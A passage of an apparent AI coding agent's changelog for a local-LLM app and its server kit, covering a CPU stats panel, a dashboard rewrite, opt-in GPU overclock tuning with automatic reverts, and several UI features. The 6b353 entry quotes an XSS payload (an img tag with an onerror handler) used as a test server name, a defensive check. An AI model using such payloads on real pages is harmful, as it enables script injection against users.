  card figure), the side pass (quick model, deadline, failure marked down, a
  Stop or a switch not), each moved pass (title, rewrite, Remote planner,
  Research with its fallback and cut), the merge under a Stop and a switch, the
  handler's lines pinned, and a mutation of each. Live, the page's own request
  against the real gateway on its stub Ollama (which now says a model reads
  pictures when told) with the `local-record` hook: a picture in Fast and in
  Thinking goes to the server's reader and nothing runs here; a refusal falls to
  this computer's reader or is said; Cloud Only and a pick of the person's don't
  reach the server; with no reader the local vision model answers as before; an
  answer of this computer's gets its title and memory pass from the server. Two
  handler mutations run on mutated copies of the app.
- Not verified here: a real server vision model reading a real picture (the stub
  only says it can), its first-word time on a real card, and nothing was looked
  at on screen.

## 6b360 — more CPU figures in the web admin panel
Patrick (2026-10-02): "can we add more cpu stats including frequency and temp
into the web admin panel?"

The server kit's panel (`ollama1/bin/ollama1-admin`, behind Cloudflare Access)
had one line for the CPU ("12%, load 0.5 0.4 0.3"). It now has a **CPU card**
under the top row of cards, and two more history charts. Read-only: no new
route that writes, no new privilege, no unit change (the panel's unit keeps
ProtectKernelTunables, which makes /sys read-only, not hidden).
- **New module `ollama1/lib/o1cpu.py`** (`CpuProbe`), written so the console
  dashboard can use it later instead of its own `o1metrics.cpu_temp()`; the
  dashboard's files were not touched (another branch is rewriting it). Nothing
  in `o1stats.py`/`o1metrics.py` changed.
- Where each figure comes from: model, cores (distinct physical id + core id
  pairs) and threads from `/proc/cpuinfo` (read every 5 minutes); driver,
  governor, min/max/rated speed from `cpu*/cpufreq/` (`scaling_driver`,
  `scaling_governor`, `scaling_min_freq`, `scaling_max_freq`,
  `cpuinfo_max_freq`); speed now per thread from `scaling_cur_freq`, else
  `cpu MHz` in `/proc/cpuinfo`; temperature from the hwmon whose NAME is
  `k10temp`, `coretemp` or `zenpower` (never by number: they change from boot
  to boot), preferring Tdie, then Tctl, then "Package id 0" (Tctl can carry a
  vendor offset on some Ryzen models), with the other sensors (Tccd1...)
  listed and the highest value seen since the panel started; busy % overall
  and per thread from `/proc/stat` deltas; load and "running of tasks" from
  `/proc/loadavg`; package power from RAPL `energy_uj` or the `amd_energy`
  chip, else the card falls back to the power sampler's `cpu_w` that the
  Power card already fetches, else the tile is hidden. RAPL's counter is
  readable only by root on current kernels, so on the panel's own user this
  is usually the sampler's figure, labelled that way.
- The note ("Slower than it could be: ...") appears when Intel's
  `thermal_throttle` counters rose in the last 5 minutes, or when the CPU is
  at least 80% busy and averaging under half its rated top speed. Plain
  words, amber text, no alarm. AMD has no throttle counter in sysfs, so only
  the second rule can fire there.
- Colours reuse the panel's thresholds for the temperature: amber at 80 C,
  red at 90 C (the stability test aborts a phase at 95 C and says so itself).
- **Every reading is optional.** One bounded reader (regular files only, never
  a symlink as the last component, never a FIFO, at most 4 KiB, 4 MiB for
  cpuinfo); numbers must be finite and in a sane range (temperature -30..150
  C, a core 1..15000 MHz) or they are dropped to None; at most 1024 threads
  are read and listed (the count is still right). A missing source is a blank
  tile, not an error, and a probe that raises leaves `cpu: null` in the state
  without touching the rest of it.
- **The model name is text from the machine.** `clean_text` keeps printable
  characters only, drops `< > & " ' ` \`, folds whitespace, and cuts at 80;
  the page also puts every CPU figure in with `textContent` or an SVG
  attribute, never markup (a test fails if `innerHTML` appears anywhere in the
  page).
- Wire and history: `/api/state` gains a `cpu` object (old fields unchanged);
  history rows grow from 7 to 9 columns (`cpu_temp` in C, `cpu_ghz`), the
  older 7-column file is still read and padded with nulls, the ring is the same
  24 h at 10 s, no faster poll. The card's two 5-minute sparklines come from
  those rows plus the latest 2-second reading.
- Tests: `tests/test_cpu.py` (fixture /sys and /proc trees: AMD k10temp +
  amd-pstate, Intel coretemp, no cpufreq, a virtual machine, a renumbered
  hwmon, garbage, 1500 threads, symlink and FIFO, hostile model, the status
  route, history, the page) and 10 mutants in `mutate.py` (hwmon by number, no
  bounds, model not cleaned, divide by zero, symlink followed, two core caps
  not applied, peak not kept, model as markup, old history dropped). Not run
  on a real Ryzen: the fixture layout follows the kernel documentation
  (k10temp, amd-pstate, cpufreq sysfs), and the card was looked at in the
  browser pane at desktop and phone width with made-up data.
- To get it on the server: `sudo bash ~/concordeai/ollama1/setup.sh` (it
  installs `lib/*.py` and the panel), then `sudo systemctl restart
  ollama1-admin`; or copy `lib/o1cpu.py` and `bin/ollama1-admin` into place
  and restart the same unit.

## 6b359 — the server's screen: boxes that can't overlap, and a bigger font
Patrick (2026-10-02), with two photos of the monitor: "Clean up the panel
that shows on the display connected to the server because it has charts
overrunning text and stuff shifting around and everything. Like, it's
impossible to read it if you look at the screenshots. It also doesn't have to
be so high resolution."

What the photos show (a 240x67 console, ASCII glyphs): wide walls of `#` from
charts, labels overwritten by other text on the same row (a network line
read "ports ... link 1000 M6.4K/s out 5.7K/s 00 Mb/s": two lines drawn into
one row), bars far from their panel, text fragments left behind.

Found in the code (the real console was not available to look at; each is
a way to produce what the photos show):
- `Canvas.put` clipped to the **screen**, never to a panel. A panel's text
  and charts were placed with offsets taken from the panel's own width
  (`ix + iw - 22`, a bar `iw - 36` wide at `ix + 13`), and in a narrow or
  short box those landed on each other and past the border.
- Widths were `len()`: the degree sign, wide characters in a model or device
  name, and (in `_lines`) text cut *before* the ASCII mapping.
- A name containing an escape sequence reached the screen as it was.
- Charts were area charts filling every row left over, up to 19 rows high:
  at 100% CPU in ASCII mode that is a solid block of `#` (the yellow wall),
  and a chart's rows were computed from the panel's share of the screen, not
  from what the text above it used.
- Output went through curses, which keeps its own picture of the screen and
  updates it with relative moves and insert/delete/repeat sequences it picks
  from terminfo. On the Linux console, after the font change at start (the
  unit runs `setfont` just before) or a resize, that picture and the glass
  disagree, which is how rows end up shifted and old fragments stay.
- The picked font was 8x16 (about 220-240 columns on 1080p), too small to
  read at a distance.

What changed (`lib/o1dashui.py` rewritten, new `lib/o1dashterm.py`,
`bin/ollama1-dash`, `lib/o1font.py`):
- One layout engine, `plan(w, h)`: the screen is a fixed grid of boxes, two
  columns from 76 wide (one below), 120 columns at most and centred above
  that, and the lowest-priority boxes are dropped when the screen is short
  (Health, Network, Storage, ...). Seven boxes: GPU, CPU and memory,
  Requests, Loaded models, Storage, Network, Health. Each is a label, a
  value and one bar or one trend line (a sparkline of eighth blocks, or
  `_.:-=+*#`), no chart walls. Built for about 100x30; 80x24 shows six boxes
  and the header carries the problem count (ALL CLEAR / N TO CHECK /
  N PROBLEMS); 240x67 is the same layout, centred.
- Every box is drawn on its **own bounded `Cells` buffer**, cut at its
  edges, and blitted (cut again) into the frame, so a widget cannot write a
  cell outside its box (tested with a widget that writes everywhere). Rows
  of a panel are columns with fixed widths, each cut with "..." to its own
  width, so one cannot run into the next.
- Text is `clean()`ed (escape sequences and control characters out) and
  measured with the true display width (`cw`: wide = 2, combining = 0).
  On the console only ASCII and the glyphs the font was checked for are
  drawn; anything else is `?`. No more braille.
- No curses. `o1dashterm.Screen` writes the frame composed in memory with
  an absolute cursor position per row, only changed rows, every row every
  30 s (heals a glitch), and a **clear whenever the size is not the one it
  last drew**; line wrap and the cursor are off. The size is read every
  time (`os.get_terminal_size` on stdout, stdin, stderr, then COLUMNS and
  LINES) and SIGWINCH makes a redraw at once. Keys: `t` (chart range), `q`
  off the console. `p` (pages) is gone: nothing is paged.
- A widget that raises shows "no data" in its own box (`ERRORS` records it
  for the tests) rather than blanking the screen.
- **Font.** `o1font.pick` now aims at 120 columns (16x32 on 1080p is about
  120x33), within 15 columns counts as the same size, then blocks over
  ASCII, then Terminus. `setup.sh` runs `dash_font_step` (in `setuplib.sh`)
  just before the dashboard restarts: `apt-get install console-setup-linux`
  and, if the distribution has it, `console-terminus`, then
  `ollama1-dash --set-font /dev/tty1`. Never fatal. Opt out with
  `--no-console-font` or `OLLAMA1_DASH_FONT=off` (a flag file,
  `/etc/ollama1/dash-font.off`, makes the unit's `--set-font` load nothing;
  setup without the opt-out removes it). Not done on purpose: a kernel
  `video=` parameter, which can leave a server with no display. The unit
  is unchanged (user `o1dash`, tty1, `ExecStartPre` set-font).
- Tests (`tests/test_dash.py`): every size 80x24, 100x30, 120x40, 160x50,
  240x67 and nine small or odd ones (down to 1x1 and up to 300x90), with
  sample, empty, None-filled and hostile data (long names, wide
  characters, escape sequences, infinity, NaN, 10**40): every row exactly
  `cols` cells, nothing outside a box but blanks, each box equal to its
  panel drawn alone, no overlap in `plan` for a sweep of sizes, the right
  panels at each size, identical on a second render, a virtual terminal
  that follows the output shows the canvas exactly after a resize over
  garbage, and a real pty run of `ollama1-dash` that is resized. Setup:
  `TestDashFont`. 27 mutants in `mutate.py` for it (clipping, resize,
  ANSI in width, truncation, wide characters, overlap, wrap, refresh,
  font target, opt-out).
- Not verified: a real Linux console. The font names (which package has
  which `.psf`), the glyphs they hold, and how the console behaves with
  the output were not tried on the server; the picker reads what is there
  and falls back to ASCII. Run `sudo ./setup.sh` on the server again
  (or just restart the dashboard after installing a font:
  `sudo systemctl restart ollama1-dash`), and `cat /run/ollama1/dash-font.json`
  says which font and glyphs it chose.

## 6b363 — main becomes the 7.0 nightly; no pre-releases until it rolls out
Patrick (2026-10-02): "Move 6.1 rc1 to stable, and when everything here is done
that we're working on, turn that into version 7.0 nightly. After that, there
won't be a pre-release for now until we roll that out."

6.1 went stable on 2026-10-02 as release v277 ("6.1", Latest), cut from the RC1
commit (1695977) on its own branch `release-6.1`, not from main (main was 111
commits past it). Main now carries everything built since, as 7.0:
`APP_VERSION = "7.0.0"`, `APP_BETA = 0`, `APP_RC = 0` (so the nightly is named
"7.0 nightly <sha>" and nothing publishes as a pre-release), and
`APP_BUILD = 277`: the stable cut took 277, so the next `./release.sh` from main
computes 278 and cannot collide with it. Until Patrick says to roll 7.0 out, no
beta or RC is cut (release.sh would refuse a beta on a line with RC 0 and no
betas anyway: it asks for `beta 7.0.0`, which is the command to avoid).
Nothing else changed in this entry.

## 6b361 — the server's graphics card: its highest power limit and a memory-clock bump
Patrick (2026-10-02) asked for "a bit more power limit and a modest VRAM clock
bump on the RX 6900 XT, about 5% faster replies", and chose "Yes, and turn it
on" (applied when he next runs setup). Then, same day: "Let the GPU use as much
power as it wants." So the power limit is the card's own maximum, not +10%.
THEN (same day, the coordinator): the kit is public, so it is OFF by default
and opt-in (`--gpu-tune`, `OLLAMA1_GPU_TUNE=1`), the choice saved in setup.env
so a re-run without the flag keeps it (Pat's own server is set up with
`--gpu-tune`). AND, nothing about tuning is to be applied to Pat's server until
he says the machine is stable (a separate drive drop-out problem is being
chased): the code is merged-ready, the server run is on hold.
Token generation reads every weight once per token, so it is bound by the
card's memory bandwidth: the memory clock is the lever, and the power limit
keeps the clocks up under load.

WHAT IS SET (`ollama1-gpu-tune`, `lib/o1gputune.py`; kit only, no app change)
- The card: the first AMD display controller under `/sys/bus/pci/devices`
  whose device id is a Navi 21 one (SIENNA_CICHLID: 73a0-73a3, 73a5, 73a8-73a9,
  73ab-73af, 73bf), never `cardN`, which can renumber. Any other card (NVIDIA,
  Intel, RDNA3, an older AMD) is a quiet no-op with one line: the +100 step and
  the table's shape are this generation's.
- Power: hwmon `power1_cap` = `power1_cap_max` (microwatts), the driver's own
  maximum, never above it (the driver would refuse it anyway). Stock is
  `power1_cap_default`. None when max <= default.
- Memory: `pp_od_clk_voltage`: `r`, `c` (to read the true stock), then
  `m 1 <min(stock + 100, OD_RANGE MCLK max)>`, `c`. In the driver's units,
  which are the memory controller's clock: GDDR6's effective rate is twice it,
  so the 6900 XT's stock 1000 is 2000 MHz. On many 6900 XTs OD_RANGE ends at
  1075, so the real step is +75 (2150 effective, +7.5%), not +100. Read back
  after the commit. If the driver refuses a write in `auto`, it tries once in
  `manual` and always puts `power_dpm_force_performance_level` back to `auto`.
  Core clocks and voltages are never written (no undervolt here). Note that
  `r` also clears any overdrive values someone set by hand.
- Overdrive: `pp_od_clk_voltage` exists only with PP_OVERDRIVE_MASK (0x4000)
  in `amdgpu.ppfeaturemask`. setup.sh writes
  `/etc/default/grub.d/97-amdgpu-overdrive.cfg` with the RUNNING mask
  (`/sys/module/amdgpu/parameters/ppfeaturemask`, hex or decimal) OR 0x4000,
  never 0xffffffff, appended to `GRUB_CMDLINE_LINUX_DEFAULT` (recovery entries
  boot without it), runs `update-grub`, checks grub.cfg carries it, and lists
  the reboot under "Still to do". The kernel logs "Overdrive is enabled" and
  taints itself with it on: expected.

SAFETY
- The check (`self_check`): 60 s of answers from an installed model (the one
  stock was measured with, else one already resident on the card, else the
  smallest that fits in 75% of VRAM; never an embedding model), straight to
  Ollama on 127.0.0.1 like the stability test. After every answer: hwmon
  temperatures (junction >= 105 C, the stability test's limit, or memory
  >= 100 C) and `journalctl -k --since @<applied>` for amdgpu ring timeouts,
  GPU resets, GPU hangs, VM/page faults (not "GPU mode1 reset" or the
  overdrive warning). Any of them puts the card back to stock at once (`r`,
  `c`, `power1_cap` = default) and records `reverted: <reason>`.
- ADDED beyond the brief, flag for Pat: (1) answers more than 5% slower than
  the stock speed measured when it was turned on (same model) also revert:
  GDDR6 retries failed transfers (EDC), so a memory clock past what the chips
  hold usually shows up as SLOWER answers, not a kernel error, and the kernel
  check alone would keep it; (2) the check writes "running" before the load,
  and a boot that finds a "running" check from an earlier boot reverts (a hard
  hang during the load may log nothing); (3) Ctrl-C during the check reverts.
- A revert sticks: `restore` (boot, wake), `apply`, `check-pending` and a
  setup re-run all skip it; only `sudo ollama1-gpu-tune on` (or `setup.sh
  --gpu-tune`) tries again. An admin's `off` is kept by a setup re-run too.
- Every boot (`restore`, before Ollama): the kernel log of the boot it last
  ran in (`journalctl -k -b <that boot id>`), read once; an amdgpu error there
  reverts. After a wake: this boot's log since it was applied.
- No model installed yet (a fresh setup): the values are set, the check runs
  without a load and stays pending; `ollama1-gpu-tune-check.service` (after
  Ollama, every boot, exits at once when nothing is pending) runs it once there
  is a model.

UNITS, SETUP, SLEEP
- `ollama1-gpu-tune.service` (oneshot, root, enabled): `ExecStartPre=` the
  same `ollama1-wait-gpu` Ollama uses, then `restore`; `Before=ollama.service`.
  No `ProtectKernelTunables` (it writes sysfs), no network.
  `ollama1-gpu-tune-check.service`: `After=ollama.service`, localhost only.
- setup.sh step 14 "Graphics card tuning", after the services (so the check
  can load a model). OFF unless asked: `--gpu-tune` / `OLLAMA1_GPU_TUNE=1`
  (flag > environment > `GPU_TUNE` in setup.env > nothing asked, which
  changes nothing and prints one plain line that the option exists; only a
  choice made is written to setup.env). `--no-gpu-tune` / `OLLAMA1_GPU_TUNE=0`
  puts the card back, disables the units and removes the drop-in, saved as
  off. First `on`: `on`; later runs: the saved choice (`apply`), keeping a
  revert or an admin's off; an explicit `--gpu-tune` flag forces `on`. `sudo ollama1-gpu-tune` is linked in
  /usr/local/sbin.
- Suspend: amdgpu restores the user's power limit and overdrive table on
  resume (`smu_restore_dpm_user_profile`, as I read the driver), but the sleep
  hook starts `ollama1-gpu-tune.service` after every wake anyway; it writes
  only what differs. The idle service and the gateway are unchanged (a check's
  load keeps the card busy, which already blocks auto sleep).

HONEST NUMBERS (README "Graphics card tuning", the guide, setup's line): the
aim is about 5% faster token generation on models that fit the card, and only
a measurement on that card proves it (`status` shows stock and tuned
tokens/s). The power maximum is roughly 15% over stock, up to about 330 W on
a 6900 XT depending on the board: more draw, heat and fan noise under load.
Pat's 1300 W supply has the headroom.

FLAGGED, NOT CHANGED
- The power part probably waits for the reboot too: on sienna_cichlid the
  driver reports `power1_cap_max` = default when overdrive is off (the upper
  OD percentage is only counted with `od_enabled`), so before the reboot
  nothing changes. The code handles both.
- The drop-in pins the mask computed at setup time. If a later kernel changes
  the driver's default mask, it isn't picked up (re-running setup reads the
  pinned value back). To refresh: `--no-gpu-tune`, reboot, setup again.
- A hard hang outside the check that logs nothing is not caught (only the
  log of the boot it last ran in is read).

TESTS: `tests/test_gputune.py` (53): fixture sysfs trees (Navi 21's table
with OD_MCLK and OD_RANGE, an older card's mV table, no table, no power
limits, NVIDIA, RDNA3, the HDMI audio function, the card renumbered between
card0 and card1), a stand-in driver that refuses a power limit above max and a
clock outside OD_RANGE (and, optionally, anything outside manual), a fake
Ollama, kernel log and clock: max power, the clamp, the mask keeping every
other bit, each revert (kernel error mid-load, junction, memory, slower, the
earlier boot, a wake, a check that never ended, Ctrl-C), a revert never
re-applied, no model then the pending check, setup's choice, status, the
command, the units, the sleep hook, setup.sh's flags (off by default, flag,
environment, a saved on kept by a re-run, the explicit off, the flag beating the
environment). mutate.py: 20 new
mutants (no clamp, card by number, mask 0xffffffff, power not max or above
max, no revert, the check running on, the earlier boot unread or ignored, the
never-ended check, re-apply after a revert at boot and in apply, both
temperature limits, slower kept, level left manual, no re-set after a wake,
setup's opt-out ignored, on by default again, a saved on not kept), all killed. Kit suite green.

NOT VERIFIED (no card here): the OD_RANGE text on kernel 7.0 (parsed as
sienna_cichlid prints it, case-insensitive "Mhz"/"MHz"); whether writes need
`manual`; whether 2150 MHz and the maximum power are stable on this card;
`journalctl --since @<epoch>` and `-b <id>` inside the unit's sandbox; a real
suspend and resume with the values set; the real speed-up. When Pat says the machine is
stable: `sudo bash ~/concordeai/ollama1/setup.sh ... --gpu-tune`, reboot,
`sudo ollama1-gpu-tune status`. NOT before.

## 6b352 — Find in chat (Cmd+F / Ctrl+F)
Patrick (2026-10-02): "Command or Control F should open a find box for the
current chat."

A small bar at the top of the chat column (`#findbar`, inside `#main`, not a
modal): a text box, "n of m", previous / next buttons and a close button.
- Opens on Cmd+F (Mac) or Ctrl+F (Windows), by the same platform test as the
  dictation chord (6b338: `IS_PC`, no Alt or Shift, the other modifier not
  held), also from the composer. It does nothing while a dialog, the palette
  or the ZITO board is up (`dictModal()`), and it takes the event
  (`preventDefault`) otherwise so the webview's own find never fires. Opened
  again, it selects the text. Enter is next, Shift+Enter previous (both wrap),
  Esc closes and clears. Esc is stopped at the box so it never reaches the
  page's Escape handler, which would abort a streaming answer.
- Case-insensitive plain text (a RegExp with the `i` flag and an escaped
  query, so `.` or `(` mean themselves and an odd capital never shifts the
  offsets). Every hit in the chat's rendered text is wrapped in
  `<mark class="find-hit">`, the current one also `.cur` and scrolled to the
  middle. Skipped: the composer (outside the chat), buttons, the copy bar on
  code blocks, the `you` / `MillenAI` labels, the message action row,
  `[hidden]` and display:none parents. Copy buttons copy the saved text, not
  the DOM, so they never see the marks; closing puts every text node back
  (`replaceChild` + `normalize`).
- Live: typing re-runs after 120 ms. While the bar is open a
  MutationObserver on the chat notices the DOM being rewritten (streaming
  replaces `innerHTML`, a chat switch or a new chat empties it) and looks
  again, at most four times a second, and only if a mark was dropped or the
  chat's text changed; the current index is kept (it restarts at 1 on a new
  query or another chat) and the view is not scrolled by these runs, so the
  stream's own scrolling is left alone. The observer exists only while the bar
  is open; closed, the page pays nothing.
- A match that spans two elements ("wor" in bold + "ld") is not found: the
  search is per text node. Left on purpose.
- Accessibility: the box and buttons carry aria-labels, the count is an
  `aria-live="polite"` region (rewritten only when it changes).
Checked in a real page (Blink pane, 1320x860): Cmd+F opened and focused it;
"apple" found 7 in a stub chat (case, inside a bold, inside a code block, in
"pineapple"), Enter / Shift+Enter moved and wrapped, a rewritten last answer
(5 stream steps) raised the count to 11 with the index kept, closing left the
chat's text-node structure byte-for-byte as before, a new chat with the bar
open dropped to "No matches", Cmd+F did nothing with a dialog open and Ctrl+F
did nothing on the Mac layout. NOT seen in WKWebView (the shipped renderer)
or on Windows (Ctrl+F). The pane is a hidden document, so the scroll-into-view
and the look were measured (bar 440 x 40 centred on the chat column), not
watched. Gauntlet: five checks (the pure part with 12 mutations over ten
scenarios in node; the page pins on source and served page; the pins' own 10
mutations; no other handler on the chord).

Review fixes (independent review, three low findings):
- Marks leaked through the step card: send() re-serialises `.worktree` from
  its outerHTML on every paint and when the answer settles, so a mark inside
  it came back as an untracked copy (stayed after Esc, counted twice). The
  card is no longer searched (`.worktree` in FIND_SKIP; it is the only
  outerHTML read in the page), and closing also sweeps any stray
  `mark.find-hit` left in the chat column.
- Esc was only caught in the find box: from the bar's buttons, or the
  composer with the bar open, it reached the page's Escape and stopped a
  streaming answer. A capture handler now closes find first for any Esc from
  inside the bar or from the composer while the bar is open (not while a
  dialog is up); with the bar closed, Esc in the composer still stops.
- No cap: one letter in a long chat made tens of thousands of marks. At most
  500 are marked (`findCapHits`; the count reads "3 of 500+", next/previous
  move within them), and a one-letter query is not re-applied while an
  answer streams (`findLive`): it waits, checking every second, and catches
  up once the answer lands.
Checked in the Blink pane: a step card's "apple" not marked; a planted stray
mark swept; "a" over ~700 a's gave "1 of 500+" with 500 marks; Esc from Next
and from the composer closed find without calling abort, and the composer's
Esc aborted again once find was closed; a one-letter query held its count
during a fake stream and caught up (1 to 4) within a second of it ending.
Gauntlet: the node check now has 14 scenarios and 19 mutations, the pins 15
mutations.

## 6b353 — "+N servers more": a link in the sidebar card and a dialog of every server
Patrick (2026-10-01): "a visible LINK in the card reading '+N servers more' (N = how many are not shown;
'+1 server more' singular) that opens a simple dialog listing EVERY paired server's details in full: name, GPU name,
GPU load %, VRAM used/total, memory in use/total, and whether it is answering ... a server not answering shows
'not answering'; an old kit shows 'usage not reported'." This is the link 6b342 parked.

- THE LINK. With one or two servers nothing changes (the card is as 6b342 left it). With a third (counted as
  the paired servers whose gateway names a card, the ones the card can draw) a `#srv-more` button sits under
  the rows, last in `#telemetry`: "+1 server more", "+2 servers more" (`srvMoreCount`, `srvMoreWord`). It is
  made and removed in `srvMetersSync`, so the rows and the link move together. The old "+N more" at the end of
  the second server's row titles is gone: the link replaces it. 10 px mono, faint, dotted underline, dim
  to text on hover, a focus ring. Card height: 22 px more (7 margin + 15 line) with a third server; with one
  or two it is exactly what it was (measured 202 px for two in the pane's 768 px window, 224 with the link; the
  198.5 in 6b342's layout note is that build's window). The sidebar still does not scroll.
- THE DIALOG. `#srvall-veil` / `#srvall-card`, the benchmark dialogs' look (veil, panel, `doorPop`),
  `role="dialog" aria-modal="true" aria-labelledby="srvall-title"`, "Your servers", one Close button. Focus
  moves to Close on open and back to the link on close (the composer if the link is gone); Tab stays on Close;
  Escape (the global handler, after the palette) and a click on the veil close it. Per server: the name and
  "answering" / "not answering", then GPU (name), GPU load (%), GPU memory ("8.5 of 16 GB"), Memory ("22 of 62
  GB in use"). It lists EVERY paired server, including one with no card named ("no card named").
- LIVE FIGURES FOR EVERY SERVER (Pat's decision, same day, on the first build's "not read" for a third server:
  "adding that so it checks the service would make sense... otherwise, it's not going to provide any
  information"). The first build drew only from `srvUse` and said "not read" for servers the card doesn't poll.
  Now, WHILE `#srvall-veil` IS OPEN, `srvPollList` is the card's first two plus every other paired server (a
  card-less one too), and `srvUseTick`/`srvMetersRefresh` use it: the same `/api/servers/usage` poll
  (`srvUsagePoll`), the same 3 s / 10 s / 30 s backoff per server, the same hidden-window rule, the same 409
  handling. Opening the dialog reads the extras at once (the pending timer is replaced by one tick; a server
  already being read is never asked twice: its due time and `busy` flag stand). Closing it (button, Escape,
  click outside) drops the extras' readings and they are never asked again; a profile 409 closes the dialog and
  stops everything, as it stops the card. The card's own two are polled exactly as before. The usage route
  never wakes a server (`server_usage` has no wake path, pinned) and neither does this: a sleeping server
  just reads "not answering". A figure with no reading yet says "reading..."; "not read" is gone.
  `srvAllRows` and the dialog's drawing still ask for nothing themselves; they repaint at the end of
  `srvMetersSync`, which every reading ends with.
- BUILT SAFELY. createElement and textContent only: a server named `<img src=x onerror=alert(1)>` shows as
  those characters (a gauntlet check counts `img` elements and `innerHTML` writes in the stand-in).
- Not seen in the app's WKWebView: only the browser pane (Blink). Dialog, focus, Escape and click outside were
  driven there with stand-in servers; the real server rows with real readings were not.
- Gauntlet: new `== the "+N servers more" link and the dialog of every server (6b353) ==` beside 6b342's: the
  link (counts 0 to 5, unpaired and card-less not counted, wording, gone again), the rows, the dialog in node
  (open, focus, repaint, the name as text, close three ways, focus back), the extra polls (only while open,
  none for the card's two twice, backoff, no wake, stop on close, on a 409 and in a hidden window), the page's pins; 6b342's
  checks changed where the old title text went (the "+N more" mutation now plants one).

## 6b354 — a "cloud" chip beside MLX and AMD
Patrick (2026-10-01): "a third engine chip next to the existing 'MLX' and 'AMD' chips: a CLOUD chip: a light-blue
dot ... and the word 'cloud', shown ONLY when cloud models are enabled, i.e. at least one provider key is added
and cloud models are switched on ... hidden when none are added or they are disabled. A provider resting on a
cooldown still counts as enabled (it is healthy, not broken). In Cloud Only mode it shows."

- `#cloud-chip` in the composer's chip row after `#srv-chips`, in the server chips' style (`.srv-chip.cloud`,
  `--ac:#7cc4ff`, the same 5 px dot with its glow); tooltip "Cloud models are on". The app is dark only, so
  one blue serves; `#7cc4ff` reads on the panel and is distinct from the Intel chip's `#3d8fe0`.
- THE RULE (`cloudChipOn`, pure): a key that is not failed AND (cloud power on OR the Cloud Only tier). The
  facts are the model menu's own (`/api/cloud`: `configured`, `turbo`; Cloud Only forces the bench on, so it
  needs no power switch), with one difference: `configured` is false while EVERY provider rests on a cooldown
  (`cloud_conf` honours the cooldown), which would hide the chip for a healthy key; so a provider with status
  "ok", resting or not, counts too. A "fail" key does not.
- REPAINTS without a reload: `paintModels` (every tier change goes through it) repaints from the held answer
  with no request; `fnCloudPaint` (the one `/api/cloud` read `paintTierAvail` makes after a key is saved,
  Settings repaints or the wizard) updates the answer; the cloud power switch re-reads on a successful save.
  A failed read leaves the chip as it was.
- Not seen in the app's WKWebView (browser pane only). Not covered: a key that goes bad or a cooldown that
  ends with Settings closed is picked up at the next repaint, not on a timer.
- Gauntlet: in the same new section: the show/hide rule over no key, key with power off, key on, resting,
  all resting, failed only, failed plus ok, Cloud Only (with key, resting, no key), no answer; the tier
  following without a request; the markup, CSS and hooks.

## 6b355 — draw on a picture you attached
Patrick (2026-10-01): "I paste it in a map and ask the app to draw over it
showing good neighborhoods for an Airbnb, but it was unable to modify the
photo. It should be able to do this sort of modification to images." He chose
(2026-10-02) to have the APP draw, not a cloud image-edit model: the model says
where, the app paints. Free, private, and it works with any model that can read
a picture.

- THE GATE. `annotate_wants()` (server, in the `image annotate` block) reads the
  request: an imperative mark/draw/highlight/circle/label/outline/point-out
  clause, "show me where ... on the map", or a passive "I'd like the good areas
  highlighted". It splits a message into sentences and clauses and only looks at
  the START of each, after "can you / I want you to / please", so a noun use
  ("what does the label say?"), a question ("how to draw a circle in CSS"),
  "draw me a cat" and "outline the key points of this chart" all pass through
  unchanged. It FAILS CLOSED: no match, and the picture goes the way it always
  did. A follow-up gate (`annotate_edit_wants`) adds the change words (bigger,
  move, remove, also, recolor ...) but only when the last assistant turn holds
  an annotate fence and the message is not a question.
- THE GRID COPY. Small vision models cannot give pixel coordinates, but they
  read a printed grid. No image library is imported by the app (PIL exists in the
  venv but not on every install), so the PAGE makes it: when a picture is
  attached, `addImageFile` also draws columns A-J, rows 1-10, and 0.1-0.9 ticks
  on a copy (`annGrid`) and rides it beside the original as `grid_images`. The
  server uses the copy only when the gate fires, in place of the original, on the
  same route the original would have taken (the vision-model rule is untouched,
  no new route to the cloud). The copy is never shown or saved; the shapes are
  drawn on the original. Both go over localhost only.
- THE ANSWER. The prompt (`annotate_instruction`) asks for prose plus ONE fenced
  block, ```annotate, of `{"shapes":[...]}` in 0..1 coordinates from the
  top-left: rect/ellipse (x, y, w, h), polygon, arrow/line (points), label; text
  at most 40 characters, a "#rrggbb" colour, a "note" for the legend, 30 shapes
  at most, and the FULL block again on a change.
- ITERATING. The previous annotate JSON is already in the assistant message the
  page sends back. The follow-up has no picture of its own, so the page sends the
  chat's newest one as `prev_image`/`prev_grid`; the server takes it only when
  the follow-up gate fires, and ignores it otherwise.
- THE RENDERER. A closed ```annotate fence in a chat that has a picture becomes a
  card: the ORIGINAL (from this session's memory of what was attached, never a
  URL) with a canvas over it, a legend of the notes, and Save image / Copy.
  `annParse` is the only reader of the JSON: JSON.parse in a try, every number
  clamped to 0..1, a shape may not spill past the edge, colour a strict
  #rrggbb or a palette default, text stripped of control and bidi characters and
  cut, anything else dropped, 30 shapes. Text only ever reaches the page through
  canvas fillText and textContent. The card is stashed behind a placeholder while
  renderMD's inline rules run (the same trick as the download box), so a note
  that says `**x**` or `[a](http://...)` cannot reach its attribute. An open
  (still streaming) fence draws nothing, and an invalid or empty closed one, or a
  chat with no picture, stays the plain code card it was. Sizes are a function of
  the canvas alone, so the screen and the saved file carry the same marks. The
  overlay follows the picture with a ResizeObserver.
- SAVE. The desktop app cannot download through WKWebView, so Save follows the
  export boxes: the page flattens original+shapes to a PNG on a canvas, POSTs it to
  `/api/annotate/save`, which writes it into exports/ as an opaque id (PNG
  signature checked, 16 MB cap, the page's own .meta) and, when asked
  (`reveal`), shows it in Finder. A browser, or a failed reveal, downloads it by
  id through `apiDownload`, and a failed POST falls back to a blob download.
  Copy puts the same PNG on the clipboard (`ClipboardItem` given a promise, so
  Safari's gesture rule holds).
- NOT KEPT. The picture is in this window's memory, not in the saved chat, so a
  restart shows an old annotate block as a plain code card. Save image is the way
  to keep one. With several pictures attached the marks go on the first.
- VERIFIED. Nine gauntlet checks: the gate against a corpus (23 positive, 27
  negative, edit phrasings) with five source mutations; the handler's wiring run
  for real on nine stand-in requests; the instruction text; the save endpoint
  live (real PNG in, bytes out, refusals); the page's parser, renderer and
  geometry in node (valid, clamped, 60 shapes, junk, hostile strings, partial
  JSON at every prefix, two scales, grid labels) with eleven mutations; and the
  served-page pins with seven. Seen in the Browser pane (Blink) with a stubbed
  picture and a written block at 1000 and 420 px wide: the marks land on the same
  features at both, a streamed answer draws nothing until the fence closes, Save
  wrote a 1280x800 PNG whose stroke pixel is the right colour, Copy delivered an
  image/png. NOT SEEN in WKWebView, the shipped renderer, and NOT SEEN with a
  real vision model: how well local models place shapes from the grid is
  unproven.
- REVIEW FIXES. An independent review found the gate fired on ordinary
